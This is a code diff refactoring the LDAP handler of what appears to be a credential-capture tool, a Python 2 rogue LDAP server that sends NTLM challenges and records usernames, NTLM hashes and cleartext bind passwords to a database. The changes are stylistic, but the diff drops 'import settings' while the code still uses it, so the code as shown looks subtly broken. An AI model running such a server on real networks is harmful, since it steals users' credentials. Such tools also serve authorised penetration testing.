@@ -14,24 +14,17 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
-import os
-import struct
-import settings
-
 from SocketServer import BaseRequestHandler
 from packets import LDAPSearchDefaultPacket, LDAPSearchSupportedCapabilitiesPacket, LDAPSearchSupportedMechanismsPacket, LDAPNTLMChallenge
 from utils import *
+import struct
 
 def ParseSearch(data):
-	Search1 = re.search('(objectClass)', data)
-	Search2 = re.search('(?i)(objectClass0*.*supportedCapabilities)', data)
-	Search3 = re.search('(?i)(objectClass0*.*supportedSASLMechanisms)', data)
-
-	if Search1:
+	if re.search(r'(objectClass)', data):
 		return str(LDAPSearchDefaultPacket(MessageIDASNStr=data[8:9]))
-	if Search2:
+	elif re.search(r'(?i)(objectClass0*.*supportedCapabilities)', data):
 		return str(LDAPSearchSupportedCapabilitiesPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))
-	if Search3:
+	elif re.search(r'(?i)(objectClass0*.*supportedSASLMechanisms)', data):
 		return str(LDAPSearchSupportedMechanismsPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))
 
 def ParseLDAPHash(data, client):
@@ -54,7 +47,7 @@ def ParseLDAPHash(data, client):
 		UserOffset   = struct.unpack('<H',data[82:84])[0]
 		User         = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
 
-		WriteHash    = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+settings.Config.NumChal
+		WriteHash    = User + "::" + Domain + ":" + LMHash + ":" + NtHash + ":" + settings.Config.NumChal
 
 		SaveToDb({
 			'module': 'LDAP',
@@ -69,20 +62,15 @@ def ParseLDAPHash(data, client):
 		print text("[LDAP] Ignoring anonymous NTLM authentication")
 
 def ParseNTLM(data,client):
-	Search1 = re.search('(NTLMSSP\x00\x01\x00\x00\x00)', data)
-	Search2 = re.search('(NTLMSSP\x00\x03\x00\x00\x00)', data)
-
-	if Search1:
+	if re.search('(NTLMSSP\x00\x01\x00\x00\x00)', data):
 		NTLMChall = LDAPNTLMChallenge(MessageIDASNStr=data[8:9],NTLMSSPNtServerChallenge=settings.Config.Challenge)
 		NTLMChall.calculate()
 		return str(NTLMChall)
-
-	if Search2:
+	elif re.search('(NTLMSSP\x00\x03\x00\x00\x00)', data):
 		ParseLDAPHash(data,client)
 
 def ParseLDAPPacket(data, client):
 	if data[1:2] == '\x84':
-
 		PacketLen        = struct.unpack('>i',data[2:6])[0]
 		MessageSequence  = struct.unpack('<b',data[8:9])[0]
 		Operation        = data[9:10]
@@ -91,7 +79,6 @@ def ParseLDAPPacket(data, client):
 		LDAPVersion      = struct.unpack('<b',data[17:18])[0]
 		
 		if Operation == "\x60":
-
 			UserDomainLen  = struct.unpack('<b',data[19:20])[0]
 			UserDomain     = data[20:20+UserDomainLen]
 			AuthHeaderType = data[20+UserDomainLen:20+UserDomainLen+1]
@@ -99,7 +86,6 @@ def ParseLDAPPacket(data, client):
 			if AuthHeaderType == "\x80":
 				PassLen   = struct.unpack('<b',data[20+UserDomainLen+1:20+UserDomainLen+2])[0]
 				Password  = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen]
-
 				SaveToDb({
 					'module': 'LDAP',
 					'type': 'Cleartext',
@@ -116,12 +102,9 @@ def ParseLDAPPacket(data, client):
 		elif Operation == "\x63":
 			Buffer = ParseSearch(data)
 			return Buffer
-		
-		else:
-			if settings.Config.Verbose:
-				print text('[LDAP] Operation not supported')
+		elif settings.Config.Verbose:
+			print text('[LDAP] Operation not supported')
 
-# LDAP Server class
 class LDAP(BaseRequestHandler):
 	def handle(self):
 		try:
@@ -132,6 +115,5 @@ class LDAP(BaseRequestHandler):
 
 				if Buffer:
 					self.request.send(Buffer)
-		
 		except socket.timeout:
 			pass
